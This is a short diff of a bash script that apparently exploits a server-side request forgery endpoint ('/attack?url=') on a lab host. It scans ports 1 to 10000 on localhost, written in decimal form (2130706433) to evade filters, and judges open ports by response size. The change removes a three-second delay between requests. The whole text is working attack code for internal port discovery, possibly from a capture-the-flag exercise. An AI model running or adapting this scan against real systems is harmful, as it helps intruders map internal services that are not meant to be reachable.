@@ -8,7 +8,6 @@ for i in {1..10000};
 	do 
 		echo "Working on Port ${i}"
 		size=$(curl http://10.10.144.204:8000/attack?url=http://2130706433:${i} -w %{size_download} --silent --output /dev/null)
-		sleep 3
 		echo "${size}"
 		if [[ size -lt 1045 ]]
 		then
